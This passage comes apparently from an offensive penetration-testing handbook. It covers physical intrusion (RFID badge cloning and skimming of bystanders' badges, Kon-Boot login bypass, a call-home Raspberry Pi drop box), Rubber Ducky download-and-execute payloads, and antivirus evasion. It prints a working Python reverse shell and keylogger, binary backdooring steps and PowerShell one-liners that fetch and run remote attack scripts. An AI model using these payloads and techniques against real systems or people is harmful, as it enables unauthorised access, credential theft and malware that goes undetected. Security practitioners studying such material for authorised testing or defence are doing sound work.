script. You do need to make sure that you have two USB network WIFI cards installed.
‚óè cd /opt/wifiphisher/
‚óè python ./wifiphisher.py
Wifiphisher will stand up a couple web servers and clone an access point of your choice.
Wifiphisher
It will deauth all other users and when they reconnect to our access point, no matter what page they
visit, they will be redirected to our malicious page. The default page is a router web admin page, but
we can just as easily use SET from our social engineering section and create a clone page of our
choice.
Fake Authentication Page
Another more manual approach of the same idea is the infernal-twin:
https://github.com/entropy1337/infernal-twin.
Feel free to play around with these attacks, develop those that work best for your environment and
customize them.
Badge Cloning
The standard in HID Badge cloning is the Proxmark 3.{38} Although this RFID tag reader/writer is a
little pricey ($400+), it is a must have. It is important to understand frequency and card types. The kit
from the HackerWarehouse comes with the following:
‚óè Low Frequency Antenna ‚Äì Tuned to operate at 125 kHz and 134 kHz and is capable
of reading proximity cards at a distance of 4cm.
‚óè High Frequency Antenna ‚Äì Tuned to operate at 13.56 mHz and is capable of
snooping the UID of a Mifare 1k classic card at a distance of 3cm.
‚óè Tag bundle ‚Äì Includes three type of RFID tags: T5557 (EM4100, HID and indala
compatible, 125 kHz) read/write card, Mifare 1K (13.56 mHz) test card, and EM4100
(125 kHz) test card.
‚óè Prox Box
The most common HID badge card I see is the ProxCard II. This card has been around for a long time
due to the low cost and ease of use, and is commonly seen in small/medium size companies. Many
companies that rent space from a shared office building usually do not have a choice in which card
their building uses. This also means these types of cards won‚Äôt be going away anytime soon.
Penetration testers love the ProxCard II because it does not have any encryption or require
challenge/response authentication by default.
Some companies use high frequency cards like Mifare, which use crypto; however even these have
been found to be vulnerable.{39} In this demonstration, we will focus on the ProxCard II.
Proxmark3
Out of the box, the Proxcard II will need to be updated. I won‚Äôt go through every step, but a great
place to get you started is located here:
https://github.com/Proxmark/proxmark3/wiki/Windows
I did have some issues trying to get the Proxmark3 to work. So, I have included my notes to help you
get through the troubleshooting process.
After the initial driver installation located in section - UPDATE PROXMARK TO THE NEW CDC
Serial INTERFACE:
‚óè After I did FLASH New Bootrom in procedure 2 and let go of Proxmark button, it
still only showed up under libusb-win32 device instead of on a COM port.
‚óè I first followed the WINDOWS PROBLEMS IN RECOGNIZING COM PORT
section to update the drivers while the button was pushed.
‚óè After completing that, I let go of the button, I unplugged again, pushed button,
replugged in, COM port showed up (only while button is pushed), and I went ahead
and updated the FLASH - Bootrom.bat, FLASH - FPGA fullimage.bat, and FLASH -
OS.bat. After that, I let go of the button and everything worked like a charm. Now, if
everything is working, run the: proxmark3.exe [com port]
There are many proxmark3 commands{40}, but we will go through the ones that matter.
‚óè lf hid fskdemod - Realtime HID FSK demodulator (Read HID tags)
‚óè lf hid clone - Clone HID to T55x7 (Write Tag ID) to a blank card
1. First put the Proxmark3 into a listener mode. Any card that is within an inch of the reader will
show the HID tags.
2. After we remove the HID card we want to clone, we are going to configure the Proxmark3 to
write back to a blank card. Put the blank card on the Antenna and use the command‚Äù lf hid clone
[TAG ID]‚Äù to write to that card.
3. We need to verify that we wrote to that card by putting the Proxmark3 back in listener mode and
making sure our new cloned card has the proper HID tags.
Proxmark3 - Badge Cloning
Once you have your device configured, you can connect the external battery back to the Proxmark3,
however, you can only clone one badge at a time. To get around this problem and the battery pack
issue, we turn to Kali Nethunter and a Nexus 7 tablet.
Get It Working In Kali Nethunter
(https://forums.kali.org/showthread.php?23151-Tutorial-make-proxmark3-works-with-nethunter):
1. Download http://thehackerplaybook.com/Download/proxdroid-bin-848.rar
2. Inside the proxdroid rar file, you need to copy the file /system/bin/proxmark3 to the Nexus‚Äô
/system/bin directory. Make sure to change the permissions to [rwxr-xr-x] (chmod 755
/system/bin/proxmark3)
3. Next, you need to copy both /system/lib/libreadline.so and /system/lib/libtermcap.so from the
rar to the /system/lib directory with permission to [rw-r--r--] (chmod 644)
4. We need to find out which port the Proxmark3 is using when connected to the Nexus Device. A
quick way to do this is: dmesg
1. [ 1449.061372] cdc_acm 1-2.1:1.0: ttyACM0: USB ACM device
[ 1449.073765] usbcore: registered new interface driver cdc_acm
[ 1449.073770] cdc_acm: USB Abstract Control Model driver for
USB modems and ISDN adapters
2. In this case our interface is using ttyACM0
5. Once we move all the files to our Nexus device and find which interface our Proxmark3 is using,
we can start up our device:
1. proxmark3 /dev/[interface - e.g. ttyACM0] in terminal from system/bin
6. I had errors with permissions on the Nexus when moving the files to /system/bin and /system/lib.
To fix that issue, I had to re-mount the /system folder.
1. Nexus7 Gen1
1. mount -o rw,remount /dev/block/platform/sdhci-tegra.3/by-name/APP/system /system ext4
ro,relatime,user_xatttr,acl,barrier=1,data=ordered 0 0
2. Nexus7 Gen2
1. mount -o rw,remount /dev/block/platform/msm_sdcc.1/by-name/system /system
Proxmark3 - Portable with Nexus
Again, the issue with running a Proxmark3 with a battery pack was that you could only clone one
card. Moreover, the issue with running it off a laptop is the size. With the Nexus tablet and a tablet
case, I am able to power and run the Proxmark3 software with full functionality. Holding the tablet
case, I can easily go in an elevator/subway/bus, hold my tablet case near everyone‚Äôs badge and
constantly collect them. I can then write them out to cards and use them to walk right in.
One other thing that I have seen from collecting tag IDs is that companies generally buy tags in bulk.
The HID tag IDs are set at the manufacturer site, so if you collect a number of tags, you can figure out
the ranges in which they exist. For example, in the example tag above (2004520045), we can bruteforce through the tags near that range. Since different badges have different permissions, it is good to
test if you are able to guess a privileged badge using something like:
https://github.com/brad-anton/proxbrute.
Kon-Boot
(http://www.piotrbania.com/all/kon-boot/) (Windows/OS X)
On a physical test, you might have gotten into the building, but you need a quick and easy way to get
onto systems and servers. This is where Kon-boot comes into play. Kon-boot is a USB device that
will allow you to bypass authentication on both Windows and OS X.
On Windows, Kon-boot has additional functionality to bypass without changing the password.
However, on OS X, you need to either reset the password to blank or create a new user. There
software works by ‚Äúvirtually modifying the EFI bios and then modifying parts of the OS X kernel.
Such changes are only made in virtual memory and they disappear after computer reboot.‚Äù
http://www.piotrbania.com/all/kon-boot/
For both Windows and OS X (and Linux), there are known ways to get around authentication. On
Windows, you can use something like ntpassword{41}, and on OS X, you can drop into single
usermode and reset the admin password.{42} However, since my focus is really on efficiency, I'll
you have to do is drop the USB drive, reboot, and log into your victim host.
The installation is pretty straightforward. After you purchase the corporate version of Kon-Boot, you
will get a Windows executable. Take any USB stick and it will install Kon-Boot onto that device. All
you need to do now is carry this little USB device:
KON-BOOT USB Stick
Windows
On a reboot or system startup, make sure it boots from the USB drive so that Kon-Boot will kick in.
Kon-Boot Bootup
After Kon-Boot finishes, you will come to a login screen with no password configured. Just hit
‚Äúenter‚Äù and you will be in the system. Another benefit is that it installs the sticky key functionality to
popup a system shell.
The best part of Kon-Boot is that once you reboot the system, the original password will be put back
on the system. The end user will never know what happened.
OS X:
OS X Kon-boot for the most part is similar to the single-user mode reset. Kon-Boot can either reset
the user account‚Äôs password or create a new user account under kon-boot:kon-boot.
Kon-boot on OS X
Kon-boot - OS X No Password
One thing to note is that this will not work against drives that are encrypted. For most tests these days,
I am finding that laptops are more often encrypted, while desktops are not.
Pentesting Drop Box - Raspberry Pi 2
On a physical engagement, a pentesting drop box is essential to have in your toolkit. You can clone a
couple badges, sneak your way into a company, drop a device onto the corporate infrastructure, and
run. Either your drop box connects back via cellular or Wi-Fi, or it creates a remote shell back to a
server of your choice.
The big professional version of this is called a PwnPlug and you can purchase one from here:
http://pwnieexpress.com/products/pwnplug- elite. The only problem is that the cost is pretty
outrageous and the chance of losing your device is pretty high.
In the previous Hacker Playbook, we used the oDroid U2, because of the speed and RAMrequirements. The only downside was that although it was a fraction of the price of the PwnPlug, it
still came to about $100 per box. If you have done a physical test before, you know you have lost a
few in the process and $100+ adds up quick.
Luckily for us, the Raspberry Pi 2 was released, which is now six times faster (900 Mhz Quad Core)
and has 1GB of RAM.{43}
You will have to buy a few items separately from the board, but not much:
‚óè Power Adaptor
‚óè USB Wi-Fi adaptor
‚óè 8 GB or larger microSD Class 10 or higher card
‚óè HDMI to view what is going on when booting the first time
Raspberry Pi 2 Running Kali Linux
Download Kali Linux Raspberry Pi 2
‚óè https://www.offensive-security.com/kali-linux-vmware-arm-image-download/
Or create your own image:
‚óè https://itfellover.com/1-kali-from-git-clone-and-booting-in-19-steps/
Setting up your new drop box with Kali is pretty easy. The guys over at Offensive Security did some
great work and included ARM support specifically for one of these devices.
Once you have downloaded or created the images for the Raspberry Pi 2, we need to install Kali on
the microSD card. Then plug your SD card into your Kali 64bit OS and locate where that device is.
You can use dmesg after you plug it in to see where it is installed. Make sure you have it configured
to the right device.
Build image on 64 bit version of Kali Linux and write image to SD Card:
‚óè wget https://raw.githubusercontent.com/offensive-security/kali-arm-buildscripts/master/build-deps.sh
‚óè chmod +x build-dep.sh && ./build-dep.sh
‚óè dd if=/root/kali-1.1.0-rpi.img of=/dev/sdb bs=4M
Move that SD Card from your Kali host onto the Raspberry Pi 2 and run some initial configurations to
update SSH, change the password, and expand the drive:
‚óè update-rc.d -f ssh remove
‚óè update-rc.d -f ssh defaults
‚óè dpkg-reconfigure openssh-server
‚óè passwd
‚óè wget https://raw.github.com/dweeber/rpiwiggle/master/rpi-wiggle
‚óè chmod +x rpi-wiggle
‚óè ./rpi-wiggle
Afterwards, you can install whichever tools you need to install onto that image.
Once you have your Raspberry Pi 2 device configured to your liking, we need to install a reverse
shell to use as a drop box. I developed a quick little script called pi_phone_home. Once installed and
running, when the drop box is plugged into any network, it automatically phones home and gives the
attack a full SSH tunnel to the drop box host.
From a terminal type:
‚óè git clone https://www.github.com/cheetz/pi_phone_home /opt/pi_phone_home
‚óè cd /opt/pi_phone_home && chmod +x *
We also need to make some modifications to the callback script. Remember that this box will log into
your server on the Internet via SSH and create a local tunnel on your server. You will have to provide
the script login credentials to your Internet-facing server:
‚óè gedit callback.sh
‚óè edit the domains, usernames, passwords, and port numbers
‚óè #!/bin/sh
‚óè if ps -ef | grep -v grep | grep [your server you own] ; then
‚óè exit 0
‚óè else
‚óè sshpass -p 'PASSWORD' ssh -o "StrictHostKeyChecking no" -f -N -T -
R2221:localhost:22 [your server you own] -p22 -l [USERNAME] >> /dev/null &
‚óè fi
Once these modifications are made, we can start up the service:
‚óè ./setup.sh
The setup file will install the proper dependencies, configure the local ssh server, make
modifications with the sshd_config, and add a cronjob to run the script every two minutes.
Dropbox SSH Tunnels
In the terminal on the right, we kicked off the setup.sh batch file on our Raspberry Pi 2 device. After
two minutes, the Pi device will connect back to our server (on the left) and login via SSH. It will
create a tunnel over port 2221.
We can see this on our server by running ‚Äúnetstat -ano | grep 2221‚Äù. If we see an output, we know
everything has worked perfectly. We can now SSH back through that tunnel to have full access on our
Raspberry Pi. We can run:
‚óè ssh [username of Raspberry Pi server]@127.0.0.1 -p [tunnel port]
As we can see on the left image above, we have connected back to our Raspberry PI through the
tunnel over SSH and ran a hostname. Now, we can kick off scans, run Metasploit, and more.
Remember, after the first time you run this code, it adds cronjob to run the script every five minutes.
So even if you unplug your device and replug it in, it will automatically connect back to your SSH
server. This is a great drop box to plug in and run away.
Rubber Ducky
(http://hakshop.myshopify.com/products/usb-rubber-ducky-deluxe)
Rubber Ducky is a USB device that is called a HID or Human Interface Device. Now that most
systems no longer allow autorun by default, we need to get creative. The Rubber Ducky device looks
just like the standard USB stick, but instead of storing files and data, they store keystrokes (like
emulating someone on the keyboard). This is how we can get around issues like autorun and quickly
use keystrokes to compromise a machine.
So if we had physical access to a computer and wanted to compromise the system, what would we
do? One way would be to hit the start menu, drop into an administrative CMD shell (bypassing UAC),
and execute a PowerShell script to download and execute a malicious payload. This might look like
the following:
Ducky admin$ cat duckycode.txt
‚óè ESCAPE
‚óè CONTROL ESCAPE (Brings up start menu)
‚óè DELAY 400
‚óè STRING cmd (types ‚Äúcmd‚Äù)
‚óè DELAY 400
‚óè MENU (right clicks on cmd)
‚óè DELAY 400
‚óè STRING a (types ‚Äúa‚Äù to select run as administrator)
‚óè DELAY 600
‚óè LEFTARROW (presses the left arrow button)
‚óè ENTER
‚óè DELAY 600
‚óè STRING cmd.exe /c "PowerShell (New-Object
System.Net.WebClient).DownloadFile('http://192.168.0.102/winword.exe','winword.ex(New-Object -com Shell.Application).ShellExecute('winword.exe')" (Runs a
PowerShell script to download and execute a file)
‚óè ENTER
‚óè STRING exit (close the command prompt)
‚óè ENTER
Try these exact same commands on your Window 7 host and you will see exactly what it is doing.
Now, we can easily change the string to download a PowerShell script instead and execute a
Meterpreter shell:
‚óè Powershell.exe -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploi-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -
Lhost 192.168.0.102 -Lport 8080 -Force
The code to run the encoder can be found on your rubber ducky or here:
https://drive.google.com/drive/#folders/0B7uVAbdkMKcXNW1KdnBrQzZtV3c
The ducky code can be injected into the microSD card using the following command (this was done
on a Mac, but is also OS independent as it runs JAVA).
The encoder jar file will take the code we supplied and write to an inject.bin file on the microSD
card. To write your code, it uses the following syntax:
‚óè java -jar encoder.jar -i [your code] -o [location and file to which to write on the
microSD card]
Example:
‚óè admins-mbp:Ducky admin$ java -jar encoder.jar -i duckycode.txt -o
/Volumes/Untitled/inject.bin
Hak5 Duck Encoder 2.6.3
Loading File ..... [ OK ]
Loading Keyboard File ..... [ OK ]
Loading Language File ..... [ OK ]
Loading DuckyScript ..... [ OK ]
DuckyScript Complete..... [ OK ]
After successfully writing to the microSD card, we can assemble our USB stick again and will be all
set. Once we plug in this USB drive into a computer, we will see the following on the computer
screen:
Rubber Ducky
This is only the beginning of what you can do with a HID device. Two additional sites that describe
additional functionality or pre-made scripts to inject into your rubber ducky are:
‚óè https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payloads
‚óè http://ducktoolkit-411.rhcloud.com/ScriptSelection.jsp
Rubber Ducky Payloads
Conclusion
Attacks where you need to be physically onsite require a lot of patience
and practice. As you probably already know, these types of attacks give
the largest adrenaline rushes. It is very important to keep calm and make
sure you know exactly what you need to do and do it as quickly as
possible. The best scenario for you is to be in and out without alarming
a single person. My advice: practice, practice, and practice.
The Quarterback Sneak - Evading AV
My feelings on Anti-Virus (AV) scanners are that they are there to stop the script kiddies or
oldmalware. If you are using the default settings for Metasploit or using files you downloaded fromthe internet, chances are that you are going to not only get caught, but your whole engagement could be
over. The element of surprise could play a huge factor in how successfully you move laterally
throughout the environment. This chapter will go into how to make sure you stay ahead of the curve
and not alert AV scanners.
Evading AV
I regularly run into AV programs that alert or block the standard Meterpreter payload, Windows
Credential Editor (WCE), or other common penetration testing tools. Even the encoders in
Metasploit, like msfvenom and Shakata Ga Nai, just aren't cutting it anymore. So here are a slew of
other options.
The Backdoor Factory
(https://github.com/secretsquirrel/the-backdoor-factory) (Kali Linux)
The goal of BDF is to patch executable binaries with user desired shellcode and continue normal
execution of the prepatched state. How can you use this to your advantage? Persistence is the key!
First, we need to find a file to which to add our shellcode. What is the best method for this?
Research was done by harmJ0y to find the best files to backdoor by searching open shares.{44} What
if we can search the file share server and find the last accessed file? This way, we know that the files
are regularly used. If you have a command shell on a victim, you can run the following two
commands:
‚óè Powershell.exe "IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsInvoke-ShareFinder -ExcludeIPC -ExcludePrint -CheckShareAccess | Out-File -
Encoding ascii found_shares.txt"
This first command will find all the shares on the network that the user has access to. You can either
modify this text file to be more targeted or go the slow route and look at all files. I have found it best
to modify this file to target file shares on the network:
‚óè Powershell.exe "IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsInvoke-FileFinder -ShareList .\found_shares.txt -FreshEXEs -ExcludeHidden -
CheckWriteAccess"
The second command takes the output from the shares and starts enumerating all the executables and
finding the LastAccessTime and LastWriteTime. In the example below, we see that Procmon.exe on
the fileshare has the very last access time. This is an indication that it could be regularly used. If we
modify this file, there is a good chance that it will get executed continually.
PowerView - Invoke-File Finder
Let‚Äôs grab a copy of Procmon.exe from the user and modify that binary. Dropping that binary back on
our Kali host, we can run BDF on that file. We are going to modify the Procmon.exe executable to
include a Meterpreter reverse https payload and connect back to your Kali host over the specified
port.
Open up a terminal using the following commands:
‚óè cd /opt/the-backdoor-factory/
‚óè ./backdoor.py -f ~/Desktop/Procmon.exe -s meterpreter_reverse_https -H <your Kali IP> -
P 8080
BDF Patching
Once you execute backdoor.py, you need to find a Cave, which is an area of 0‚Äôs to hold your
shellcode. If you don‚Äôt like the locations initially suggested, you can press ‚Äúj‚Äù or jump to see
additional caves.
BDF Caves
Once you find a cave that works, press ‚Äúa‚Äù to append your code. After this is complete, BDF will
drop the newly created executable in the folder backdoored.
Now, take that file and put it back on the fileshare. The file should execute perfectly, the user will
still have all the functionality of Procmon, but every time they run it, it will connect back to our
Metasploit handler.
Malicious Procmon
Just in case you forgot how to create a handler for your file, this is what it will look like. On your
Kali host, copy the following text to a file on /opt/listener.rc:
‚óè use exploit/multi/handler
set PAYLOAD windows/meterpreter/reverse_https
set LHOST <Your Kali IP>
set LPORT 8080
set ExitOnSession false
exploit -j ‚Äìz
To start your listener, use the following command:
‚óè msfconsole -r /opt/listner.rc
Meterpreter Session
Hiding WCE From AV (windows)
I love Windows Credential Editor (WCE) because it can take clear text passwords from memory.
However, the problem with WCE is that all AV vendors pretty much flag this executable. The quick
and simple way to bypass AV is through a process of identifying where the AV signature is inside the
WCE file and modifying it.
Example: Evade
(https://www.securepla.net/antivirus-now-you-see-me-now-you-dont/) (Windows)
On your Windows host, open Evade (Evade takes that executable and makes multiple versions of that
file based on the defined size. Let's say you have a 50k file and you wanted to split the file by 5k. It
will make 10 different versions of that file. The first one will only be the first 5k of the file (will
contain the MZ header and some additional information). The second file will include the first 5k and
include the next 5k of data. This goes for the rest of the files.
In the following examples, we loaded WCE, defined an output location and hit Split! If we look in the
folder defined in our output, we see that it chopped up the files.
Evade
Evade Output
We should have a bunch of different files. If we open a hex editor (HxD) and look at one of the files,
we see that the first 5000 bytes are in the first file and 10,000 bytes are in the second file.
File Comparison
If we open up our calculator, we can see if we subtract the hex values 270F - 1387, we get 1388.
Converting 1388 to Decimal, we get 5000. Perfect!
Start with the smallest file (5k) and scan that file with your AV of choice. Does an AV signature
trigger on that file? If no, keep going through each version of that file. When you finally do get AV to
trigger, you know that something between the last file and the clean file contains the string that the
Antivirus program looks for.
Finding Which File Triggers AV
When dropping the folder containing all of the split files, AV instantly starts alerting the user about
malicious files and starts cleaning up. When the cleanup is complete, we now see that all the files are
still present in that folder before TestFile_130000. That means between the 125000 bytes mark and
130000 bytes mark of the file is the trigger IDS signatures.
Let's see what is at that location. If we convert the Decimal of 125000 to HEX we get 1E848. Let's
take a look in HxD to see what is there. From the location 1E848, we can look around to see what
caused the signature to fire or we can run Evade again to get more granular.
In this case, it looks like I was able to identify what the IDS signature is looking for‚Äìit looks for the
name of the application and the owner.
Identifying the String that Triggers AV
With HxD, we can write over these values and save our executable to a new file.
Modifying the Signature to Evade AV
I wrote over those values with all A's and saved my file as wce2.exe. Luckily, the signature in this
case was not actually part of the binary executable, but part of the application output. Let's take our
sample to the AV box and run the scan again.
Successful AV Scan
After scanning the file, AV was no longer able to pick up the file and the application still ran
perfectly. One thing to note here is that this worked because the values we modified in the file did not
impact the execution of the executable. If the signature was based on code that couldn't be modified to
run, we would not be able to use this trick. I just wanted to demonstrate some weaknesses with AV
and the concept of how to bypass them.
Veil
(https://github.com/Veil-Framework) (Kali Linux)
Veil is a Payload Generator to Bypass Antivirus tool created by Christopher Truncer. This tool uses a
lot of different methods to evade AV, but it is best known for taking the Meterpreter shell, converting
it to python, and wrapping it around py2exe/pyinstaller. This way the executable can bypass a lot of
white-listing tools and AV. This is because python is usually an approved white-listed application
and can be easily encoded so that it can bypass AV. There are a lot of different ways to use Veil, but I
will go over the most general.
‚óè cd /opt/Veil/Veil-Evasion
‚óè ./Veil-Evasion.py
‚óè To see all payloads
‚óã list
‚óè We are going to use python/meterpreter/rev_https
‚óã use 25
‚óã set LHOST [Your Kali IP]
‚óã generate
‚óã use pyinstaller
Veil-Evasion
The output results in two files:
1. Under /root/veil-output/compiled/ is the executable to drop on the Windows system
2. The other file /root/veil-output/handlers/undetected_handler.rc is the Metasploit handler file.
First, set up the listener for the handler:
‚óè msfconsole -r /root/veil-output/handlers/undetected_handler.rc
Execute the payload on the Windows victim host:
Veil-Evasion - Python
I highly recommend testing with the Ruby executable as well. Instead of using the payload
python/meterpreter/rev_https, select ruby/meterpreter/rev_https. The process is the same, but instead
of a pyinstaller executable, it is a Ruby executable.
Veil-Evasion - Ruby
Why pick Ruby over python? This is all about testing which works best for the environment in which
you are testing. I have seen instances where AV might pick up one type of file, but will not pick up
another. Keep testing and you will find the best solution for your current situation.
SMBExec
(https://github.com/pentestgeek/smbexec)(Kali Linux)
SMBExec is a tool developed by brav0hax (https://github.com/brav0hax/smbexec), which contains a
lot of different functionalities. In this book, we have used the tool to pull hashes from a domain
controller, but it can also be used to enumerate shares, validate logins, disable UAC, and create an
obfuscated Meterpreter executable. Brav0hax utilizes a number of different obfuscation techniques,
including randomization and compiling it in native C to bypass AV (read the source code of
smbexec.sh). This is what we are going to use to create our reverse shell.
To create an obfuscated reverse Meterpreter executable:
‚óè cd /opt/smbexec
‚óè ./smbexec.sh
‚óè Select System Access with the following command:
‚óã 2
‚óè Select Create an executable and rc script
‚óã 2
‚óè Select windows/meterpreter/reverse_https
‚óã 2
‚óè Enter your local host and port
‚óã 172.16.139.209
‚óã 443
Once SMBExec finishes and you exit out of the application, a new folder is created in that same
directory. It follows a similar timestamp folder name. Inside that folder, you will see the
backdoor.exe, which is your obfuscated reverse https Meterpreter executable.
root@kali:/opt/smbexec/2015-03-23-1425-smbexec# ls -alh
-rwxr-xr-x 1 root root 110K Mar 23 14:28 backdoor.exe
-rw-r--r-- 1 root root 283 Mar 23 14:28 metasetup.rc
-rw-r--r-- 1 root root 92 Mar 23 14:28 sha1-backdoor.hash
In that same folder you will also see the metasetup.rc script. RC scripts will be discussed a little later
in the book, but if you take a look at the file, you will see something similar to the code below:
‚óè spool /opt/smbexec/2015-03-23-1425-smbexec/msfoutput-1425.txt
‚óè use exploit/multi/handler
‚óè set payload windows/meterpreter/reverse_https
‚óè set LHOST 172.16.139.209
‚óè set LPORT 443
‚óè set SessionCommunicationTimeout 600
‚óè set ExitOnSession false
‚óè set InitialAutoRunScript migrate -f
‚óè exploit -j -z
This is a script that automatically configures and runs a reverse handler for the payload you just
generated. It also adds commands, such as setting up timeouts and automigrating PIDs. To run the RC
script, use the following command:
‚óè msfconsole -r metasetup.rc
PeCloak.py
(http://www.securitysift.com/pecloak-py-an-experiment-in-av-evasion/) (Windows)
peCloak.py is a python script that takes an automated approach to AV evasion. Although this is
experimental code, I really like what Mike Czumak did. He took many of the common evasion tricks
and wrote something to automate them. He built a simple encoder/decoder, added a number of
instructions that waste cycles in an effort to trick the AV scanner, and utilized code caves (like we
discussed with The BackDoor Factory).
Installation does take a few steps and this was installed on a 32bit Windows XP system:
‚óè Download http://www.securitysift.com/download/peCloak.py
‚óè Install
http://sourceforge.net/projects/winappdbg/files/additional%20packages/PyDasm/
‚óè Install https://code.google.com/p/pefile/downloads/list
‚óè Save ‚Äúhttp://git.n0p.cc/?
p=SectionDoubleP.git;a=blob_plain;f=SectionDoubleP.py;h=93717cdd0ac293548fb995as SectionDoubleP.py
I also had to also modify the peCloak.py file:
‚óè On Line 220 - I had to change ‚Äúpe.write(pe.OPTIONAL_HEADER.SizeOfHeaders,
filename=fname) # MODIFIED WRITE FUNCTION IN PEFILE!!!‚Äù to
‚Äúpe.write(‚Äòcloaked.exe‚Äô)‚Äù
Once we get peCloak.py running, we can test this on a copy of wce.exe:
‚óè python.exe peCloak.py -e .text,.data:50:5000 wce.exe
peCloak.py Beta
As we can see, it will go through all of the evasion techniques and produce an output file called
‚Äúcloaked.exe‚Äù. In the image below, we take our modified binary and run it to make sure it executes
normally. When executing, you will notice it does take longer before it runs after execution due to all
the extra instructions added by peCloak.py.
peCloak.py - Cave Jumps
When running the obfuscated wce.exe file through VirusTotal, we find that it doesn‚Äôt get picked up by
many of the common corporate AV solutions.
Virus Total Results
Remember, this is really beta code, but I wanted to demonstrate how you can write your own
obfuscators.
Python
Python is your best friend. I use Python to create most of my exploits and tools. There are several
reasons why Python works so well. First, it is common to see systems which white-list applications
that allow python files. Second, you can very easily add randomness to get around any signature. And
third, using something like py2exe you can turn the file into a self-running executable.
Python Shell
Watching Dave Kennedy's talk at BSides in 2012{45}, took me down the track of using Python to
create malicious payloads. The simplest example of this was creating a python shell and wrapping it
up with py2exe.
‚óè #!/usr/bin/python
import socket, subprocess
HOST = '192.168.10.100'
PORT = 5151
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send('[*] Connection Established!')
while 1:
data = s.recv(1024)
if data == 'quit': break
proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE,
stderr=subprocess.PIPE, stdin=subprocess.PIPE)
stdout_value = proc.stdout.read() + proc.stderr.read()
s.send(stdout_value)
s.close()
When this code executes, it will create a shell connection back to 192.168.10.100, where I will have
netcat listening on port 5151. This reverse shell will give me command line access into the host.
Using pyinstaller, we can convert the python file into an executable:
‚óè C:\python27\python.exe C:\utils\pyinstaller-2.0\pyinstaller.py --out=C:\shell\ --
noconsole --onefile C:\shell\shell.py
Again, if you try to scan this file with AV, it won't be picked up.
Python Keylogger
Everyone uses different types of keyloggers and this is no different. My goal was to develop
something that would most likely be accepted on white-listed application lists and be able to run
undetected by AV. Included below is simple code to have python start recording all keyboard
presses:{46}
‚óè import pyHook, pythoncom, sys, logging
file_log = 'C:\\systemlog.txt'
def OnKeyboardEvent(event):
logging.basicConfig(filename=file_log, level=logging.DEBUG, format='%(message)s')
chr(event.Ascii)
logging.log(10, chr(event.Ascii))
return True
hooks_manager = pyHook.HookManager()
hooks_manager.KeyDown = OnKeyboardEvent
hooks_manager.HookKeyboard()
pythoncom.PumpMessages()
Here is my setup.py file:
‚óè from distutils.core
import setup
import py2exe
setup(options = {'py2exe': {'bundle_files': 1, 'compressed': True}},
windows = [{'script': "logger.py"}],
zipfile = None,
)
And using py2exe, I will convert the python script to an executable with the following commands:
‚óè python.exe setup.py install
‚óè python.exe setup.py py2exe
Now I will have an executable binary of the keylogger that records all keystrokes and stores all of the
key strokes to C:\systemlog.txt. Pretty simple and easy and AV never detected it. If you need to, you
may add some randomness in there to make sure that it isn't picked up by signatures or hash matching.
Other Keyloggers
Being able to drop an undetectable keylogger can make a huge difference in situations where you
can‚Äôt pull passwords from memory or look for web-based passwords. I will show you two different
examples that can be executed from a command line.
Keylogger Using Nishang
(https://github.com/samratashok/nishang):
Nishang is a collection of PowerShell scripts used for pre/post exploitation. One of the scripts is
called keylogger.ps1. As I keep reiterating throughout the book, and as you will notice in different
penetration tests, nothing ever works perfectly. You will need to know different ways to execute
commands and understand that different environments may or may not allow you to do certain things.
In this case, we assume that we have a shell on the system. We are going to use bitsadmin, which is
used by Microsoft Windows to download updates, to download our keylogger and put it in the public
folder. We will then go to the public folder and execute the keylogger. The keylogger has many other
functions, such as pushing the logs to Twitter, so I recommend you read through it before executing
anything.
‚óè cmd.exe /c "bitsadmin /transfer myjob /download /priority high
https://raw.githubusercontent.com/cheetz/nishang/master/Gather/Keylogger.ps1
c:\Users\Public\Keylogger.ps1"
‚óè cd \users\public\
‚óè powershell.exe -NoP -W Hidden -exec bypass -noexit -Command
".\Keylogger.ps1 http://127.0.0.1 stopthis"
The output will be located at:
‚óè C:\Users\[Account]\AppData\Local\Temp\key.log
Note that when looking at the file, it is obfuscated and needs to be converted. Once you move this file
onto your box, convert the logs using the PowerShell script located here:
https://raw.githubusercontent.com/cheetz/nishang/master/Utility/Parse_Keys.ps1.
Here is the command to convert the logs:
‚óè powershell.exe -exec bypass -Command "& {Import-Module .\Parse_Keys.ps1;
Parse_Keys key.log output.log}"
And your decoded keylog output file is written to output.log.
Keylogger Using Powersploit
(https://github.com/mattifestation/PowerSploit):
The other keylogger with which I have had some success is the Get-Keystrokes PowerShell script.
Similar to running the Nishang script, this can be executed by the following command:
‚óè powershell.exe -exec bypass IEX "(New-Object
Net.WebClient).DownloadString('https://raw.github.com/cheetz/PowerSploit/master/ExKeystrokes.ps1');Get-Keystrokes -LogPath C:\Users\Public\key.log"
‚óè
Conclusion
There are many different techniques to evade AV. Although this is not a complete list, this should give
you a good overview on where to start if you are battling anti-virus. The last thing you want is for AV
to stop you from popping a box that you can potentially exploit.
Penetration testing is all about trying out different tools, techniques, and tactics to find what works in
that particular environment. Remember not to submit your executable to a repository like Virus Total,
as the lifespan of your executable might shrink dramatically.
Special Teams - Cracking, Exploits, And Tricks
This section focuses on all other methods that can assist in penetration testing, but do not fit in the
other sections. I will discuss some of the tips and tricks I have for cracking password hashes,
searching for vulnerabilities, and some short cuts.
Password Cracking
There are many different tools to use with password cracking, however, I am going to focus mainly on
two tools that I use. These two tools are John the Ripper (JtR) and oclHashcat. These are both
excellent tools for cracking passwords.
Before I can start talking about different password crackers, it is important to make sure you
understand the basic definitions. The three configurations you should generally make for an efficient
password cracking process are to define wordlists, rules, and hashing algorithms.
Wordlists: This is exactly what it sounds like‚Äìthey are files that contain password lists in cleartext.
The password cracker software will try to hash each one of these passwords and see if they match the
hash that you are trying to crack.
I generally like to take wordlists from prior password compromises and incorporate them with the
type of organization you are dealing with. For example, if you are cracking NTLM hashes from a
domain controller, make sure you understand what their password policy is. There is no point trying
four or five-letter passwords if they require a minimum of eight characters.
Here are some of my favorite wordlists:
List Name: RockYou
Details: Compromised in 2009 from a social game and advertising website. This is a great list to start
with as it isn't too large and contains a lot of the common passwords with a decent success rate.
Download Link:
